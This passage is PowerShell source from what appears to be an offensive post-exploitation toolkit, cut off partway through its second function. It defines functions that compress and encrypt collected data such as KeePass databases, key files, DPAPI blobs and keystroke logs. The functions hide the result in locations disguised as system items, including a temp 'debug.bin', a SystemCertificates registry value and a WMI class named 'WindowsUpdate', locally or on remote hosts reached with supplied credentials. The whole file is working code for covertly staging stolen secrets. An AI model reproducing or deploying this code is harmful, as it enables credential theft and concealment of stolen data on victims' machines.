#requires -version 2

$Null = [Reflection.Assembly]::LoadWithPartialName('System.Security')
$Null = [Reflection.Assembly]::LoadWithPartialName('System.Core')


function Write-EncryptedStore {
<#
    .SYNOPSIS

        Encrypts data in the 'EncryptedStore' format and stores it in the specified -StorePath file.

        Invoke-WMIMethod parameters and approach adapted from @mattifestation's Invoke-WmiCommand.ps1.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Wraps Out-EncryptedStore to encypt input data, and stores it to the specified -StorePath location.

    .PARAMETER Data

        The path of a file to encrypt and add to the store, passable on the pipeline.

    .PARAMETER StorePath

        The path of the encrypted store to stash files. Can be on the filesystem ("${Env:Temp}\debug.bin"),
        registry (HKLM:\SOFTWARE\something\something\key\valuename), or WMI (ROOT\Software\namespace:ClassName).
        If registry or WMI storage is selected, the registry key/custom WMI class will be implicitly created
        on initial run if it does not already exist.

        If you want to access a store on a remote system, use -ComputerName/-Credential.

    .PARAMETER Key

        The key used to encrypt data for the store. A 32 character string is interpretered as an AES key,
        a string of the form '^<RSAKeyValue><Modulus>.*</Modulus><Exponent>.*</Exponent></RSAKeyValue>$' is
        interpreted as an RSA public key, and anything else is fed into a MD5 hash function to produce a
        32 character password for AES encryption.

    .PARAMETER SecureKey

        A [System.Security.SecureString] used for the encryption key, following the same parsing logic from
        the key parameter description above.

    .PARAMETER DataTag

        Optional flag to tag data with if it's not a file.

    .PARAMETER StoreSizeLimit

        Size limit for the encrypted datastore. Default to 1GB.

    .PARAMETER ComputerName

        Access the -StorePath on the specified computers. The default is the local computer.

        Type the NetBIOS name, an IP address, or a fully qualified domain
        name of one or more computers. To specify the local computer, type
        the computer name, a dot (.), or "localhost".

        This parameter does not rely on Windows PowerShell remoting. You can
        use the ComputerName parameter even if your computer is not
        configured to run remote commands.

    .PARAMETER Credential

        Specifies a user account that has permission to perform this action.

        The default is the current user. Type a user name, such as "User01",
        "Domain01\User01", or User@Contoso.com. Or, enter a PSCredential
        object, such as an object that is returned by the Get-Credential
        cmdlet. When you type a user name, you will be prompted for a
        password.

    .PARAMETER Impersonation

        Specifies the impersonation level to use. Valid values are:

            0: Default (Reads the local registry for the default impersonation level, which is usually set to "3: Impersonate".)
            1: Anonymous (Hides the credentials of the caller.)
            2: Identify (Allows objects to query the credentials of the caller.)
            3: Impersonate (Allows objects to use the credentials of the caller.)
            4: Delegate (Allows objects to permit other objects to use the credentials of the caller.)

    .PARAMETER Authentication

        Specifies the authentication level to be used with the WMI connection. Valid values are:

            -1: Unchanged
            0:  Default
            1:  None (No authentication in performed.)
            2:  Connect (Authentication is performed only when the client establishes a relationship with the application.)
            3:  Call (Authentication is performed only at the beginning of each call when the application receives the request.)
            4:  Packet (Authentication is performed on all the data that is received from the client.)
            5:  PacketIntegrity (All the data that is transferred between the client  and the application is authenticated and verified.)
            6:  PacketPrivacy (The properties of the other authentication levels are used, and all the data is encrypted.)

    .PARAMETER EnableAllPrivileges

        Enables all the privileges of the current user before the command
        makes the WMI call.

    .PARAMETER Authority

        Specifies the authority to use to authenticate the WMI connection.
        You can specify standard NTLM or Kerberos authentication. To use
        NTLM, set the authority setting to ntlmdomain:<DomainName>, where
        <DomainName> identifies a valid NTLM domain name. To use Kerberos,
        specify kerberos:<DomainName\ServerName>. You cannot include the
        authority setting when you connect to the local computer.

    .EXAMPLE

        PS C:\> Write-EncryptedStore -Data C:\Folder\secret.txt -StorePath C:\Temp\debug.bin -Key 'Password123!'

        Compresses and encrypts C:\Folder\secret.txt with 'Password123!' and appends
        to the encrypted store at C:\Temp\debug.bin

    .EXAMPLE

        PS C:\> 'secret.txt','secret2.txt' | Write-EncryptedStore -StorePath C:\Temp\debug.bin -Key 'Password123!'

        Compresses and encrypts secret.txt and secret2.txt with 'Password123!' and appends
        to the encrypted store at C:\Temp\debug.bin

    .EXAMPLE

        PS C:\> "keystrokes" | Write-EncryptedStore -StorePath C:\Temp\debug.bin -Key 'Password123!' -DataTag 'keylog'

        Compresses and encrypts the data passed on the pipeline with 'Password123!' and appends
        to the encrypted store at C:\Temp\debug.bin with a filepath compromised of a timestamp
        and the 'keylog' datatag (i.e. 'keylog3.12.2016_12.10.15.txt').

    .EXAMPLE

        PS C:\> Find-KeePassConfig | Write-EncryptedStore -StorePath C:\Temp\debug.bin -Key 'Password123!'

        Finds all KeePass related files using Find-KeePassConfig and stores them an encrypted store
        at C:\Temp\debug.bin using the key 'Password123!'.

    .EXAMPLE

        PS C:\> $Key = New-RSAKeyPair
        PS C:\> $StorePath = "HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCertificate"
        PS C:\> ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -Key $Key.Pub
        PS C:\> Read-EncryptedStore -StorePath $StorePath -Key $Key.Priv -List

        Generates a new RSA public/private key pair with New-RSAKeyPair, uses the public
        key to encrypt a file from disk, and stores the result in the specified registry location.
        The call to Read-EncryptedStore extracts the stored data using the private key and
        displays the files in the container.

    .EXAMPLE

        PS C:\> $StorePath = "ROOT\Software:WindowsUpdate"
        PS C:\> $SecurePassword = 'Password12345' | ConvertTo-SecureString -AsPlainText -Force
        PS C:\> ".\secret.txt" | Write-EncryptedStore -StorePath $StorePath -SecureKey $SecurePassword -Verbose
        VERBOSE: EncryptionKey not 32 Bytes, using MD5 of key specified as the AESencryption key.
        VERBOSE: RawDataStore length: 613
        VERBOSE: Creating namespace 'ROOT\Software'
        VERBOSE: Creating class 'WindowsUpdate' in namespace 'ROOT\Software'
        VERBOSE: Setting 'Content' value of ROOT\Software:WindowsUpdate

        Stores a password in a secure string, and uses this to encrypt the specified document. The store is
        then written to a custom WMI class, which is first created as it doesn't exist.

    .EXAMPLE

        PS C:\> $ComputerName = 'PRIMARY.testlab.local'
        PS C:\> $Credential = Get-Credential 'TESTLAB\administrator'
        PS C:\> $StorePath = 'HKLM:\SOFTWARE\Microsoft\SystemCertificates\DomainCert'
        PS C:\> ".\secret.txt" | Write-EncryptedStore -ComputerName $ComputerName -Credential $Credential -StorePath $StorePath -Key 'Password123!'

        Take the local "secret.txt" file, compress/encrypt it, and store it in the specified registry
        key on the remote system using the specified credentials.

    .LINK

        https://github.com/PowerShellMafia/PowerSploit/blob/c2a70924e16cd80a1c07d9de82db893b32a4aba9/CodeExecution/Invoke-WmiCommand.ps1
#>

    [CmdletBinding(DefaultParameterSetName = 'Key')]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Object[]]
        $Data,

        [Parameter(Position = 1)]
        [ValidatePattern('.*\\.*')]
        [String]
        $StorePath = "${Env:Temp}\debug.bin",

        [Parameter(Position = 2, Mandatory = $True, ParameterSetName = 'Key')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Key,

        [Parameter(Position = 2, Mandatory = $True, ParameterSetName = 'SecureKey')]
        [ValidateNotNullOrEmpty()]
        [System.Security.SecureString]
        $SecureKey,

        [Parameter(Position = 4)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DataTag,

        [Parameter(Position = 5)]
        [ValidateNotNullOrEmpty()]
        [Int]
        $StoreSizeLimit = 100MB,

        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        $WmiMethodArgs = @{}
        $WMIConnectionOptions = New-Object Management.ConnectionOptions

        # If additional WMI cmdlet properties were provided, proxy them to Invoke-WmiMethod
        if ($PSBoundParameters['Credential']) {
            $WmiMethodArgs['Credential'] = $Credential
            $WMIConnectionOptions.Username = $Credential.UserName
            $WMIConnectionOptions.SecurePassword = $Credential.Password
        }
        if ($PSBoundParameters['Impersonation']) {
            $WmiMethodArgs['Impersonation'] = $Impersonation
            $WMIConnectionOptions.Impersonation = $Impersonation
        }
        if ($PSBoundParameters['Authentication']) {
            $WmiMethodArgs['Authentication'] = $Authentication
            $WMIConnectionOptions.Authentication = $Authentication
        }
        if ($PSBoundParameters['EnableAllPrivileges']) {
            $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges
            $WMIConnectionOptions.EnableAllPrivileges = $EnableAllPrivileges
        }
        if ($PSBoundParameters['Authority']) {
            $WmiMethodArgs['Authority'] = $Authority
            $WMIConnectionOptions.Authority = $Authority
        }

        if ($PSBoundParameters['SecureKey']) {
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureKey)
            $EncryptionKey = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
        else {
            $EncryptionKey = $Key
        }
    }

    PROCESS {

        foreach ($Computer in $ComputerName) {

            $EncStoreArguments = @{
                'Data' = $Data
                'Key' = $EncryptionKey
                'DataTag' = $DataTag
            }

            # get the encrypted store bytes
            $RawDataStore = Out-EncryptedStore @EncStoreArguments

            Write-Verbose "[$Computer] RawDataStore length: $($RawDataStore.Length)"
            Write-Verbose "[$Computer] Writing to encrypted store at: '$StorePath'"

            if(($StorePath -match '^[A-Z]:\\') -or ($StorePath -match '^\\\\[A-Z0-9]+\\[A-Z0-9]+')) {
                # file on a disk, local or remote, or \\UNC path

                if($Computer -ne 'localhost') {
                    # remote -ComputerName specification
                    $Net = New-Object -ComObject WScript.Network

                    $PathParts = $StorePath.Replace(':', '$').Split('\')
                    $UNCPath = "\\$ComputerName\$($PathParts[0..($PathParts.Length-2)] -join '\')"
                    $FileName = $PathParts[-1]

                    if($PSBoundParameters['Credential']) {
                        try {
                            # map a temporary network drive with the credentials supplied
                            # this is because New-PSDrive in PowerShell v2 doesn't support alternate credentials :(
                            Write-Verbose "[$Computer] Mapping drive Z: to '$UNCPath'"
                            $Net.MapNetworkDrive("Z:", $UNCPath, $False, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                            $EncStorePath = "Z:\$FileName"
                        }
                        catch {
                            throw "[$Computer] Error mapping path '$StorePath' : $_"
                        }
                    }
                    else {
                        $EncStorePath = "$UNCPath\$FileName"
                    }
                }
                else {
                    # plain old localhost
                    $EncStorePath = $StorePath
                }

                if(Test-Path -Path $EncStorePath) {
                    if ( (Get-Item -Path $EncStorePath).Length -gt $StoreSizeLimit) {
                        throw "[$Computer] Store size exceeded, exiting"
                    }
                }

                try {
                    Write-Verbose "[$Computer] Writing $($RawDataStore.Count) encrypted bytes to $EncStorePath"
                    Add-Content -Encoding Byte -Path $EncStorePath -Value $RawDataStore -ErrorAction Stop
                }
                catch {
                    Write-Warning "[$Computer] Error writing to '$EncStorePath' : $_"
                }

                if($Computer -ne 'localhost' -and ($PSBoundParameters['Credential'])) {
                    try {
                        Write-Verbose "[$Computer] Unmapping drive Z:\"
                        $Net = New-Object -ComObject WScript.Network
                        $Null = $Net.RemoveNetworkDrive('Z:', $True)
                    }
                    catch {
                        Write-Verbose "[$Computer] Error unmapping drive Z:\ : $_"
                    }
                }
            }
            elseif($StorePath -match '^(HKCR|HKCU|HKLM|HKU|HKCC):\\') {
                # registry storage

                $RegistryParts = $StorePath.Split('\')
                $KeyName = ($RegistryParts[0..($RegistryParts.Length - 2)]) -join '\'
                $ValueName = $RegistryParts[-1]

                if($Computer -ne 'localhost') {
                    # remote registry storage
                    # logic heavily adopted from @mattifestation's Invoke-WmiCommand.ps1 logic

                    $WmiMethodArgs['ComputerName'] = $Computer

                    $RegistryKeyParts = $KeyName.Split('\')
                    $RegistryKeyPath = $RegistryKeyParts[1..($RegistryKeyParts.Length)] -join '\'

                    switch ($RegistryKeyParts[0]) {
                        'HKLM:' { $Hive = 2147483650 }
                        'HKCU:' { $Hive = 2147483649 }
                        'HKCR:' { $Hive = 2147483648 }
                        'HKU:' { $Hive = 2147483651 }
                        'HKCC:' { $Hive = 2147483653 }
                    }

                    $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CreateKey' -ArgumentList @($Hive, $RegistryKeyPath)

                    if ($Result.ReturnValue -ne 0) {
                        throw "[$Computer] Unable to create the following registry key: $KeyName"
                    }

                    # get any existing registry data
                    $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetBinaryValue' -ArgumentList @($Hive, $RegistryKeyPath, $ValueName)

                    Write-Verbose "[$Computer] Storing the encrypted store into the following registry value: $StorePath"
                    $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'SetBinaryValue' -ArgumentList @($Hive, $RegistryKeyPath, $ValueName, $($Result.uValue + $RawDataStore))

                    if ($Result.ReturnValue -ne 0) {
                        throw "[$Computer] Unable to store encrypted store in the following registry value: $StorePath"
                    }
                }
                else {
                    # localhost registry storage
                    if(-not (Test-Path -Path $KeyName)) {
                        try {
                            Write-Verbose "[$Computer] Creating registry key '$KeyName'"
                            $Null = New-Item -Path $KeyName -Force -ErrorAction Stop
                        }
                        catch {
                            throw "[$Computer] Error creating '$KeyName' : $_"
                        }
                    }

                    try {
                        $Value = (Get-ItemProperty -Path $KeyName -Name $ValueName -ErrorAction Stop).$ValueName

                        if ( $Value.Length -gt $StoreSizeLimit) {
                            throw "[$Computer] Store size exceeded, exiting"
                        }

                        # "append" the new data to the registry key
                        $Null = Set-ItemProperty -Path $KeyName -Name $ValueName -Value $($Value + $RawDataStore) -ErrorAction Stop
                    }
                    catch {
                        Write-Verbose "[$Computer] Value $ValueName doesn't exist!"
                        $Null = New-ItemProperty -Path $KeyName -Name $ValueName -PropertyType Binary -Value $RawDataStore
                    }
                }
            }
            elseif($StorePath -match '^[A-Z0-9]*\\.*:[A-Z0-9]+$') {
                # WMI storage

                # adapted from Sw4mpf0x's PowerLurk project (https://github.com/Sw4mpf0x/PowerLurk)
                # create the new custom WMI namespace
                $WMIParts = $StorePath.Split(':')
                $NamespaceName = $WMIParts[0]
                $ClassName = $WMIParts[-1]
                $NamespaceParts = $NamespaceName.Split('\')

                if($Computer -ne 'localhost') {
                    $WmiMethodArgs['ComputerName'] = $Computer

                    try {
                        Write-Verbose "NamespaceName: $NamespaceName"
                        Write-Verbose "ClassName: $ClassName"
                        $WmiClass = Get-WmiObject @WmiMethodArgs -Namespace $NamespaceName -List -ErrorAction Stop | Where-Object {$_.Name -eq $ClassName}
                        if(-not $WmiClass) {
                            throw [System.Management.Automation.RuntimeException]'Not found'
                        }
                    }
                    catch {
                        if($_.Exception.GetBaseException().ErrorCode -eq 'InvalidNamespace') {
                            Write-Verbose "[$Computer] Creating namespace '$NamespaceName'"

                            $Namespace = Get-WmiObject @WmiMethodArgs -Class 'meta_class' | Where-Object {$_.Name -eq '__NAMESPACE'}
                            $CustomNamespace = $Namespace.CreateInstance()
                            $CustomNamespace.Name = $NamespaceParts[-1]
                            $Null = $CustomNamespace.Put()

                            Write-Verbose "[$Computer] Creating class '$ClassName' in namespace '$NamespaceName'"

                            $MagementScope = New-Object Management.ManagementScope @("\\$Computer\$NamespaceName", $WMIConnectionOptions)
                            $MagementScope.Connect()

                            $CustomClass = New-Object Management.ManagementClass($MagementScope, $NamespaceName, $Null)
                            $CustomClass.Name = $ClassName
                            $CustomClass.Properties.Add('Content', [System.Management.CimType]::UInt8, $True)
                            $Null = $CustomClass.Put()

                            $WmiClass = $CustomClass
                        }
                        elseif(($_.Exception.GetBaseException().ErrorCode -eq 'NotFound') -or ($_.Exception.GetBaseException().ErrorCode -eq 'InvalidClass') -or ($_.Exception.Message -eq 'Not Found')) {
                            Write-Verbose "[$Computer] Creating class '$ClassName' in namespace '$NamespaceName'"

                            $MagementScope = New-Object Management.ManagementScope @("\\$Computer\$NamespaceName", $WMIConnectionOptions)
                            $MagementScope.Connect()

                            $CustomClass = New-Object Management.ManagementClass($MagementScope, $NamespaceName, $Null)
                            $CustomClass.Name = $ClassName
                            $CustomClass.Properties.Add('Content', [System.Management.CimType]::UInt8, $True)
                            $Null = $CustomClass.Put()

                            $WmiClass = $CustomClass
                        }
                        else {
                            throw "[$Computer] Unidentified error : $_"
                        }
                    }
                }
                else {
                    # local WMI class specification
                    try {
                        $WmiClass = [WmiClass] $StorePath
                    }
                    catch {
                        if($_.Exception.GetBaseException().ErrorCode -eq 'InvalidNamespace') {
                            Write-Verbose "[$Computer] Creating namespace '$NamespaceName'"
                            $Namespace = [WMIClass] "$($NamespaceParts[0..($NamespaceParts.Length - 2)] -join '\'):__namespace"
                            $CustomNamespace = $Namespace.CreateInstance()
                            $CustomNamespace.Name = $NamespaceParts[-1]
                            $Null = $CustomNamespace.Put()

                            Write-Verbose "[$Computer] Creating class '$ClassName' in namespace '$NamespaceName'"
                            $CustomClass = New-Object Management.ManagementClass($NamespaceName, $Null, $Null)
                            $CustomClass.Name = $ClassName
                            $CustomClass.Properties.Add('Content', [System.Management.CimType]::UInt8, $True)
                            $Null = $CustomClass.Put()

                            $WmiClass = $CustomClass
                        }
                        elseif(($_.Exception.GetBaseException().ErrorCode -eq 'NotFound') -or ($_.Exception.GetBaseException().ErrorCode -eq 'InvalidClass')) {
                            Write-Verbose "[$Computer] Creating class '$ClassName' in namespace '$NamespaceName'"

                            $CustomClass = New-Object Management.ManagementClass($NamespaceName, $Null, $Null)
                            $CustomClass.Name = $ClassName
                            $CustomClass.Properties.Add('Content', [System.Management.CimType]::UInt8, $True)
                            $Null = $CustomClass.Put()

                            $WmiClass = $CustomClass
                        }
                        else {
                            throw "[$Computer] Unidentified error : $_"
                        }
                    }
                }

                if($WmiClass) {
                    Write-Verbose "[$Computer] Setting 'Content' value of $StorePath"
                    try {
                        $WmiClass.SetPropertyValue('Content', $($WmiClass.GetPropertyValue('Content') + $RawDataStore))
                        $Null = $WmiClass.Put()
                    }
                    catch {
                        throw "[$Computer] Error setting 'Content' at $StorePath : $_"
                    }
                }
            }
            else {
                throw "[$Computer] Invalid StorePath format : $StorePath"
            }
        }
    }
}


function Out-EncryptedStore {
<#
    .SYNOPSIS

        Encrypts data in the 'EncryptedStore' format and outputs the raw encrypted bytes to the pipeline.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Compresses and encrypts the data passed by $Data with the
        supplied $Key and writes the data to the specified encrypted $StorePath.
        If the passed data is a filename, the file is encrypted along with
        the original path. Otherwse, the passed data itself is encrypted along
        with a timestamp to be used as the extracted file format.
        If you to tag non-file data, use -DataTag.

        Multiple files/data sets can be stored in the same $StorePath (see below).
        Use Read-EncryptedStore to extract files from a specified store.

        Store structure:

            [4 bytes representing size of next block to decrypt]
            [0] (indicating straight AES)
            [16 byte IV]
            [AES-CBC encrypted file block]
                [compressed stream]
                    [260 characters/bytes indicating original path]
                    [file contents]
            ...

            [4 bytes representing size of next block to decrypt]
            [1] (indicating straight RSA+AES)
            [128 bytes random AES key encrypted with the the RSA public key]
            [16 byte IV]
            [AES-CBC encrypted file block]
                [compressed stream]
                    [260 characters/bytes indicating original path]
                    [file contents]
            ...

        To encrypt a file for ENCSTORE.bin:

            -Read raw file contents
            -Pad original full file PATH to 260 Bytes
            -Compress [PATH + file] using IO.Compression.DeflateStream
            -If using RSA+AES, generate a random AES key and encrypt using the RSA public key
            -Generate random 16 Byte IV
            -Encrypt compressed stream with AES-CBC using the predefined key and generated IV
            -Calculate length of encrypted block + IV
            -append 4 Byte representation of length to ENCSTORE.bin
            -append 0 byte if straight AES used, 1 if RSA+AES used
            -optionally append 128 bytes of RSA encrypted random AES key if RSA+AES scheme used
            -append IV to ENCSTORE.bin
            -append encrypted file to ENCSTORE.bin

    .PARAMETER Data

        The path of a file to encrypt and add to the store, passable on the pipeline.

    .PARAMETER Key

        The key used to encrypt data for the store. A 32 character string is interpretered as an AES key,
        a string of the form '^<RSAKeyValue><Modulus>.*</Modulus><Exponent>.*</Exponent></RSAKeyValue>$' is
        interpreted as an RSA public key, and anything else is fed into a MD5 hash function to produce a
        32 character password for AES encryption.

    .PARAMETER SecureKey

        A [System.Security.SecureString] used for the encryption key, following the same parsing logic from
        the key parameter description above.

    .PARAMETER DataTag

        Optional string to tag data with if it's not a file.

    .PARAMETER Base64Encode

        Switch. Output the encrypted store bytes as a Base64 string.

    .EXAMPLE

        PS C:\> Out-EncryptedStore -Data C:\Folder\secret.txt -Key 'Password123!'

        Compresses and encrypts C:\Folder\secret.txt with 'Password123!' and outputs the raw encrypted
        bytes to the pipeline.

    .EXAMPLE

        PS C:\> $Key = New-RSAKeyPair
        PS C:\> 'secret.txt','secret2.txt' | Out-EncryptedStore -Key $Key.Pub

        Compresses and encrypts secret.txt and secret2.txt with 'Password123!' and and outputs the
        raw bytes encrypted with the specified RSA public key to the pipeline.

    .EXAMPLE

        PS C:\> "keystrokes" | Out-EncryptedStore -Key 'Password123!' -DataTag 'keylog'

        Compresses and encrypts the data passed on the pipeline with 'Password123!' and outputs the raw
        bytes to the pipeline with a timestamp and the 'keylog' datatag (i.e. 'keylog3.12.2016_12.10.15.txt').

    .EXAMPLE

        PS C:\> Find-KeePassConfig | Out-EncryptedStore -Key 'Password123!'

        Finds all KeePass related files using Find-KeePassConfig and outputs the raw bytes to the pipeline.

    .EXAMPLE

        PS C:\> Find-KeePassConfig | Out-EncryptedStore -Key 'Password123!' -Base64Encode

        Finds all KeePass related files using Find-KeePassConfig and outputs the raw bytes to the pipeline
        as a base64-encoded string.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Object[]]
        $Data,

        [Parameter(Position = 1, Mandatory = $True, ParameterSetName = 'Key')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Key,

        [Parameter(Position = 1, Mandatory = $True, ParameterSetName = 'SecureKey')]
        [ValidateNotNullOrEmpty()]
        [System.Security.SecureString]
        $SecureKey,

        [Parameter(Position = 2)]
        [String]
        $DataTag,

        [Parameter(Position = 3)]
        [Switch]
        $Base64Encode
    )

    BEGIN {
        $Encoding = [System.Text.Encoding]::ASCII
        [Byte[]]$AllEncryptedBytes = @()

        if ($PSBoundParameters['SecureKey']) {
            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureKey)
            $EncryptionKey = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
        else {
            $EncryptionKey = $Key
        }

        if($EncryptionKey -match '^<RSAKeyValue><Modulus>.*</Modulus><Exponent>.*</Exponent></RSAKeyValue>$') {
            Write-Verbose "Using RSA public key for encryption."
            $EncryptionType = 'RSA'
        }
        elseif($EncryptionKey.Length -eq 32) {
            Write-Verbose "Using 32 byte AES key for encryption."
            $EncryptionType = 'AES'
        }
        else {
            Write-Verbose "EncryptionKey not 32 Bytes, using MD5 of key specified as the AES encryption key."

            # transform the encryption key to a MD5 hash if the key is not 32 Bytes
            $StringBuilder = New-Object System.Text.StringBuilder
            [System.Security.Cryptography.HashAlgorithm]::Create('MD5').ComputeHash($Encoding.GetBytes($EncryptionKey)) | ForEach-Object { [Void]$StringBuilder.Append($_.ToString("x2")) }
            $EncryptionKey = $StringBuilder.ToString()
            $EncryptionType = 'AES'
        }

        function local:Out-StoreEncryptedByte {
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [Byte[]]
                $FullPathBytes,

                [Parameter(Mandatory=$True)]
                [Byte[]]
                $DataBytes,

                [Parameter(Mandatory=$True)]
                [String]
                $EncryptionKey,

                [Parameter(Mandatory=$True)]
                [ValidateSet('AES', 'RSA')]
                [String]
                $EncryptionType
            )

            try {
                $Encoding = [System.Text.Encoding]::ASCII

                # build the compressed(PATH + file) stream
                $MemoryStream = New-Object System.IO.MemoryStream
                $CompressionStream = New-Object System.IO.Compression.DeflateStream($MemoryStream, [System.IO.Compression.CompressionMode]::Compress)
                $StreamWriter = New-Object System.IO.StreamWriter($CompressionStream)
                $StreamWriter.Write([Char[]]($FullPathBytes + $DataBytes))
                $StreamWriter.Close()

                # generate the random IV bytes
                $RNG = [Security.Cryptography.RNGCryptoServiceProvider]::Create()
                $RandomIVBytes = New-Object Byte[](16)
                $RNG.GetBytes($RandomIVBytes)

                $StreamBytes = $MemoryStream.ToArray()

                if($EncryptionType -eq 'AES') {
                    # set up paramters for the AES + CBC encryption w/ random IV
                    $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                    $AES.Mode = 'CBC'
                    $AES.Key = $Encoding.GetBytes($EncryptionKey)
                    $AES.IV = $RandomIVBytes

                    # '0' indicates straight AES
                    [Byte[]]$EncryptedBlock = $RandomIVBytes + $AES.CreateEncryptor().TransformFinalBlock($StreamBytes, 0, $StreamBytes.Length)

                    [BitConverter]::GetBytes($EncryptedBlock.Length)
                    [Byte]0
                    $EncryptedBlock
                }
                else {
                    # generate a random AES key
                    $RandomAESKeyBytes = New-Object Byte[](32)
                    $RNG.GetBytes($RandomAESKeyBytes)

                    # build the RSA public key to encrypt the random AES key
                    $CSP = New-Object System.Security.Cryptography.CspParameters
                    $CSP.Flags = $CSP.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore
                    $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList @(1024,$CSP)
                    $RSA.FromXmlString($EncryptionKey)

                    # encrypt the randomized AES key using RSA
                    $EncAESKeyBytes = $RSA.Encrypt($RandomAESKeyBytes, $False)

                    # set up paramters for the AES + CBC encryption w/ random IV
                    $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                    $AES.Mode = 'CBC'
                    $AES.Key = $RandomAESKeyBytes
                    $AES.IV = $RandomIVBytes

                    $EncBytes = $AES.CreateEncryptor().TransformFinalBlock($StreamBytes, 0, $StreamBytes.Length)

                    # '1' indicates RSA + AES
                    # [Byte[]]$EncryptedBlock = $EncAESKeyBytes + $RandomIVBytes + $AES.CreateEncryptor().TransformFinalBlock($StreamBytes, 0, $StreamBytes.Length)
                    [Byte[]]$EncryptedBlock = $EncAESKeyBytes + $RandomIVBytes + $EncBytes

                    [BitConverter]::GetBytes($EncryptedBlock.Length)
                    [Byte]1
                    $EncryptedBlock
                }
            }
            catch {
                Write-Error "Error in encryption : $_"
            }
        }
    }

    PROCESS {

        ForEach($InputData in $Data) {

            # handle output from Get-KeePassConfig.ps1
            if($InputData.PSObject.TypeNames -contains 'KeePass.Config') {

                # extarct all KeePass files from the Find-KeePassConfig output object
                $KeePassFiles = @()
                $KeePassFiles += $InputData.KeePassConfigPath
                $KeePassFiles += $InputData.LastUsedFile
                $KeePassFiles += $InputData.DefaultKeyFilePath
                $KeePassFiles += $InputData.DefaultDatabasePath
                $KeePassFiles += $InputData.RecentlyUsed

                if($InputData.DefaultUserAccountData) {
                    $KeePassFiles += $InputData.DefaultUserAccountData.UserKeePassDPAPIBlob
                    $InputData.DefaultUserAccountData.UserMasterKeyFiles | ForEach-Object {
                        $KeePassFiles += $_
                    }
                }

                $KeePassFiles = $KeePassFiles | Where-Object {$_} | ForEach-Object {
                    if($_ -is [System.IO.FileSystemInfo]) {
                        $_ | Select-Object -ExpandProperty Path
                    }
                    elseif($_ -is [System.Management.Automation.PathInfo]) {
                        $_ | Select-Object -ExpandProperty Path
                    }
                    elseif($_ -is [String]) {
                        $_
                    }
                    else {
                        Write-Warning "Invalid path type for $_ : $($_.GetType())"
                    }
                } | Where-Object {$_.Trim() -ne ''} | Sort-Object -Unique

                $KeePassFiles | ForEach-Object {
                    $FilePath = $_
                    Write-Verbose "Encrypting file : $FilePath"

                    $FilePathPadded = $FilePath.PadRight(260)
                    $FilePathPaddedBytes = $Encoding.GetBytes($FilePathPadded)
                    [Byte[]]$FileBytes = [System.IO.File]::ReadAllBytes($FilePath)

                    $EncDataBytes = Out-StoreEncryptedByte -FullPathBytes $FilePathPaddedBytes -DataBytes $FileBytes -EncryptionKey $EncryptionKey -EncryptionType $EncryptionType

                    if($Base64Encode) {
                        $AllEncryptedBytes += $EncDataBytes
                    }
                    else {
                        $EncDataBytes
                    }
                }

                # save off the custom object
                $FullPath = "data\KeePassConfig_$(Get-Date -format M.d.yyyy_H.m.s).txt".PadRight(260)
                $FullPathBytes = $Encoding.GetBytes($FullPath)

                [Byte[]]$DataBytes = $Encoding.GetBytes( $($InputData | Format-List | Out-String) )

                $EncDataBytes = Out-StoreEncryptedByte -FullPathBytes $FullPathBytes -DataBytes $DataBytes -EncryptionKey $EncryptionKey -EncryptionType $EncryptionType

                if($Base64Encode) {
                    $AllEncryptedBytes += $EncDataBytes
                }
                else {
                    $EncDataBytes
                }
            }

            elseif($InputData.PSObject.TypeNames -contains 'KeePass.Keys') {
                $FullPath = "data\KeePassKeys_$(Get-Date -format M.d.yyyy_H.m.s).txt".PadRight(260)
                $FullPathBytes = $Encoding.GetBytes($FullPath)

                [Byte[]]$DataBytes = $Encoding.GetBytes( $($InputData | Format-List | Out-String) )

                $EncDataBytes = Out-StoreEncryptedByte -FullPathBytes $FullPathBytes -DataBytes $DataBytes -EncryptionKey $EncryptionKey -EncryptionType $EncryptionType

                if($Base64Encode) {
                    $AllEncryptedBytes += $EncDataBytes
                }
                else {
                    $EncDataBytes
                }
            }

            elseif((-not $DataTag) -or (Test-Path -Path $InputData -ErrorAction SilentlyContinue)) {
                # if the passed data is a file name, pad the path to the max Windows path length (260)

                try {
                    $ResolvedPath = $(Resolve-Path -Path $InputData -ErrorAction Stop | Select-Object -Expand Path)
                    $FullPath = $ResolvedPath.PadRight(260)
                    $FullPathBytes = $Encoding.GetBytes($FullPath)

                    [Byte[]]$DataBytes = [System.IO.File]::ReadAllBytes($ResolvedPath)

